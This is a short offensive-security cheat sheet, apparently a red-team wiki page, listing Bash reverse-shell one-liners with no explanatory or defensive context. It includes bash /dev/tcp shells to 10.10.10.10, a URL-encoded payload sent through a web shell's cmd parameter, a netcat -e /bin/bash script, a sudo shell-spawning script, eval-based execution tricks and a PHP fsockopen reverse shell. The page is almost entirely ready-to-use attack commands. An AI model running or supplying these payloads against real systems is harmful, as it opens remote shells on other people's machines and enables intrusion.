---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/execution/bash-reverse-shell
---

# Bash - Reverse Shell

## One-liner

```basic
bash -i >& /dev/tcp/10.10.10.10/8000 0>&1
bash -c 'bash -i >& /dev/tcp/10.10.10.10/18000 0>&1'
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.10.10/5555+0>%261'
curl http://127.0.0.1:52846/shell.php?cmd='bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.10.10/5555%200%3E%261%27'
```

## Base-Execution

```basic
echo '#!/bin/bash' > run
echo 'nc 10.10.10.10 18000 -e /bin/bash' >> run
----
echo -e '#!/bin/bash\nbash' > test.sh
chmod +x test.sh
sudo ./test.sh
----
echo 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8000 0>&1"' > test.txt
eval $(cat test.txt)
---
echo 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8000 0>&1"' > test.txt
$(bash test.txt)
chmod +x test.txt
$(./test.txt)
```

## Bash-PHP

```basic
#!/bin/bash
php -r '$sock=fsockopen("10.10.10.10",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
